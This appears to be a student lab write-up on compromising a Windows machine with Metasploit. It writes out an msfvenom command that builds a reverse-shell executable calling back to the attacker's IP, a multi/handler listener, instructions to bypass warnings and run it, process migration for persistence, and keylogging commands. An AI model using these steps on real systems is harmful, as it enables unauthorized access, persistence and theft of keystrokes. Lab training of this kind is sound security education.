# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="598" height="362" alt="image" src="https://github.com/user-attachments/assets/58a7f659-61c5-4761-ba93-c86b6b1c20d7" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="720" height="116" alt="image" src="https://github.com/user-attachments/assets/a23b6c03-7adb-48ea-902b-435802c3b754" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="287" height="43" alt="image" src="https://github.com/user-attachments/assets/6e81c1d9-eb63-4b3e-8c04-22ac8fcae332" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="278" height="35" alt="image" src="https://github.com/user-attachments/assets/091628bd-99ed-489d-bd9f-be1e266fb52e" />

Check the status of apache2
## OUTPUT:


<img width="919" height="389" alt="image" src="https://github.com/user-attachments/assets/2c5565a4-7462-45b2-a9ca-909ea39730bc" />

Invoke msfconsole:
## OUTPUT:
<img width="688" height="518" alt="image" src="https://github.com/user-attachments/assets/13d862cf-1327-43a3-8d0c-5749f3fbffe0" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:


<img width="914" height="851" alt="image" src="https://github.com/user-attachments/assets/c8ff41ea-c596-4f90-b062-2b47adebc4ab" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="603" height="131" alt="image" src="https://github.com/user-attachments/assets/b6eb1383-d36f-4f7b-8f40-9d1d77f31369" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:


<img width="1035" height="336" alt="image" src="https://github.com/user-attachments/assets/d24c5f60-80fc-486d-a59a-21132dd4dc6a" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1033" height="178" alt="image" src="https://github.com/user-attachments/assets/56ac4eee-f740-4b2b-a2e1-c61d1c5dcc40" />


On kali/parrot give the command exploit
## OUTPUT:



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="415" height="68" alt="image" src="https://github.com/user-attachments/assets/fc771fac-8fef-4b79-9b34-cc103209ac1a" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="775" height="143" alt="image" src="https://github.com/user-attachments/assets/a9218d8a-0282-478a-87bc-52d8524c5ff3" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


